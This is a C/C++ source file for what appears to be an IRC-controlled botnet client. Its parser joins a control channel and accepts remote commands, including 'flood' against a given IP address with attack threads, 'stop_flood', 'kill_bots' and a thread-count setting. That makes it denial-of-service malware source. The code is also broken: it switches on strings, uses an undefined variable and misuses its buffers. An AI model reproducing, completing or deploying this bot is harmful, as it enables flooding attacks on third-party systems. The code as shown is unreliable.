#include <cstring>
#include <string>

int ircParse(char *line){

    char *buf[MAX_LINE_SIZE];
    char *parseline[MAX_LINE_SIZE], *words[MAX_WORDS];
    int i = 0, err = 1;

    printf("Parsing line: %s\n", line);

    *(words + i) = strtok(line, ": ");
	while (*(words + i) != NULL && i <= MAX_WORDS){
		i++;
		words[i] = strtok(NULL, ": ");
	}

	switch(words[1]){

        case "422":

            snprintf(buf, sizeof(buf), "%s %s\r\n", "JOIN", CHAN);
            if(send(sock, buf, strlen(buf), 0) < 0){
                printf("Could not send JOIN\n");
                return -1;
            }
            else{
                printf("Joined channel %s\n", CHAN);
                memset(buf, 0, sizeof(buf));
                return 1;
            }
            break;

        case "433":

            snprintf(buf, sizeof(buf), "%s %s\r\n", "NICK", generateNick());
            if(send(sock, buf, strlen(buf), 0) < 0){
                printf("Could not send NICK\n");
                return -1;
            }
            else{
                return 1;
            }
            break;

        case "PRIVMSG":

            if (!strncmp(w[3], "!", strlen("!")) && strlen(w[3]) > strlen("!")){
                i = 3;
                while (w[i] != NULL){
                    memset(w[i], '\x20', strlen("!"));
                    sprintf(parseline, "");
                    while (strncmp(w[i], "!", strlen("!")) != 0)
                    {
                        snprintf(parseline, sizeof(parseline),"%s %s", parseline, w[i]);
                        i++;
                        if (words[i] == NULL){
                                break;
                        }
                    }
                    err = ircParseCommand(parseline);
                    if (err < 1){
                        return err;
                    }
                }
                return 1;
            }
            printf("PRIVMSG: invalid arguments\n");
            return -1;
            break;
        }

        if(words[4] == NULL){
            return -1;
        }

        else if (!strcmp(words[1], "332") && strncmp(words[4], "!", strlen("!")) == 0 && strlen(words[4]) > strlen("!")){

            i = 4;
            while (words[i] != NULL){
                memset(words[i], '\x20', strlen("!"));
                sprintf(parseline, "");
                while (strncmp(words[i], "!", strlen("!")) != 0){
                    snprintf(parseline, sizeof(parseline), "%s %s", parseline, words[i]);
                    i++;

                    if (words[i] == NULL){
                            break;
                    }
                }
                err = ircParseCommand(parseline);
                if (err < 1){
                    return err;
                }
            }

            return 1;

        }

	return 1;
}


int ircParseCommand(char *line){

    char buf[MAX_LINE_SIZE];
    char cmd[MAX_WORDS];
    int i = 0;

    printf("Command to parse: %s\n", line);

    cmd[i] = strtok(line, " ");
    while(cmd[i] != NULL && i <= MAX_WORDS){
        i++;
        cmd[i] = strtok(NULL, " ");
    }

    switch(cmd[0]){

        case NULL:
            return -1;
            break;

        case "kill_bots":
            snprintf(buf, sizeof(buf), "%s :disconnecting\r\n", "QUIT");
            send(sock, buf, strlen(buf), 0);
            memset(buf, 0, sizeof(buf));
            return 2;
            break;

        case "flood":
            if(cmd[1] != NULL && cmd[2] != NULL){
                if(inet_addr(cmd[1]) != INADDR_NONE){
                    int tmp;
                    try{
                        tmp = std::stoi(cmd[2]);
                    }
                    catch(...){
                        printf("flood: invalid arguments\n");
                        return -3;
                    }
                    initThreads();
                    attachThreads(threads, attr, args, THREAD_NUM);
                    return 3;
                }
                printf("flood: invalid arguments\n");
                return -3;
            }
            print("flood: invalid arguments\n");
            break;

        case "stop_flood":
            killThreads(threads, THREAD_NUM);
            printf("Stopped flooding\n");
            return 4;
            break;

        case "toggle_mptcp":
            MPTCP_ENABLED = !MPTCP_ENABLED;
            printf("MPTCP_ENABLED set to %d\n", MPTCP_ENABLED);
            return 5;
            break;

        case "set_threadnum":
            if(cmd[1] != NULL){
                int tmp;
                try{
                    tmp = std::stoi(cmd[1]);
                }
                catch(...){
                    printf("set_threadnum: invalid argument\n");
                    return -6;
                }
                THREAD_NUM = tmp;
                printf("THREAD_NUM set to %d\n", THREAD_NUM);
                return 6;
            }
            printf("set_threadnum: invalid argument\n");
            return -6;
            break;

        default:
            printf("Unknown command\n");
            return -7;
            break;
    }

	return 1;
}

